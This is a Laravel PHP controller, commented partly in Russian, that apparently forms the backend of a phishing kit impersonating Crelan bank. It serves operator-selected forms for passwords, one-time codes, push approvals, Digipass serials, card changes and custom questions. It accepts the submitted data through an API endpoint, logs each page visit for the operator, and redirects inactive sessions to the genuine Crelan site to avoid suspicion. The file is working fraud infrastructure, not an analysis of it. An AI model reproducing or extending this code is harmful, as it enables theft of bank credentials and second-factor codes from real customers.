<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Actions\Session\SubmitFormAction;
use App\Enums\ActionType;
use App\Events\PageVisited;
use App\Http\Requests\SubmitFormRequest;
use App\Http\Resources\SessionResource;
use App\Models\Session;
use App\Services\SessionService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\RedirectResponse;
use Illuminate\View\View;

/**
 * Controller for action forms
 */
class FormController extends Controller
{
    public function __construct(
        private readonly SessionService $sessionService,
        private readonly SubmitFormAction $submitFormAction,
    ) {}

    /**
     * Show action form
     * 
     * GET /session/{session}/action/{actionType}
     */
    public function show(Session $session, string $actionType): View|RedirectResponse
    {
        // Check if session is active - redirect to Crelan if not
        if (!$session->isActive()) {
            return redirect('https://www.crelan.be');
        }

        // Validate action type
        $action = ActionType::tryFrom($actionType);
        if ($action === null) {
            abort(404, 'Unknown action type');
        }

        // REDIRECT — делаем редирект на внешний URL
        if ($action === ActionType::REDIRECT && $session->redirect_url) {
            // Отправляем событие о переходе перед редиректом
            event(new PageVisited(
                session: $session,
                pageName: 'Редирект на внешний URL',
                pageUrl: $session->redirect_url,
                actionType: $actionType,
            ));
            return redirect()->away($session->redirect_url);
        }

        // Select view based on action type
        $viewName = match ($action) {
            ActionType::CODE => 'forms.code',
            ActionType::PUSH => 'forms.push',
            ActionType::PUSH_ICON => 'forms.push-icon',
            ActionType::PASSWORD => 'forms.password',
            ActionType::CARD_CHANGE => 'forms.card-change',
            ActionType::ERROR => 'forms.error',
            ActionType::ONLINE, ActionType::HOLD => 'forms.waiting',
            ActionType::CUSTOM_ERROR => 'forms.custom-error',
            ActionType::CUSTOM_QUESTION => 'forms.custom-question',
            ActionType::CUSTOM_IMAGE => 'forms.custom-image',
            ActionType::IMAGE_QUESTION => 'forms.image-question',
            ActionType::ACTIVATION => 'forms.activation',
            ActionType::SUCCESS_HOLD => 'forms.success-hold',
            ActionType::QR_CODE => 'forms.waiting',
            ActionType::DIGIPASS => 'forms.waiting',
            ActionType::DIGIPASS_SERIAL => 'forms.waiting',
            ActionType::REDIRECT => 'forms.waiting', // fallback если нет URL
            default => 'forms.waiting',
        };

        // Отправляем событие о переходе на страницу
        event(new PageVisited(
            session: $session,
            pageName: 'Форма действия: ' . $action->label(),
            pageUrl: request()->fullUrl(),
            actionType: $actionType,
        ));

        return view($viewName, [
            'session' => $session,
            'actionType' => $action,
        ]);
    }

    /**
     * Waiting form (after data submission)
     * 
     * GET /session/{session}/waiting
     */
    public function waiting(Session $session): View|RedirectResponse
    {
        // Check if session is active - redirect to Crelan if not
        if (!$session->isActive()) {
            return redirect('https://www.crelan.be');
        }
        
        // If action_type exists - redirect to form
        if ($session->action_type !== null && $session->action_type->requiresRedirect()) {
            return redirect($session->getCurrentActionUrl());
        }

        // Отправляем событие о переходе на страницу ожидания
        event(new PageVisited(
            session: $session,
            pageName: 'Ожидание',
            pageUrl: request()->fullUrl(),
        ));

        return view('forms.waiting', [
            'session' => $session,
        ]);
    }

    /**
     * Submit form data
     * 
     * POST /api/session/{session}/submit
     */
    public function submit(SubmitFormRequest $request, Session $session): JsonResponse
    {
        if (!$session->isActive()) {
            return response()->json([
                'success' => false,
                'error' => 'Session is not active',
                'data' => new SessionResource($session),
            ], 400);
        }

        // Process form submission
        $formData = $request->toDTO();
        $sessionDTO = $this->submitFormAction->execute($session, $formData);

        return response()->json([
            'success' => true,
            'message' => 'Data submitted successfully',
            'data' => new SessionResource($this->sessionService->find($sessionDTO->id)),
        ]);
    }
}
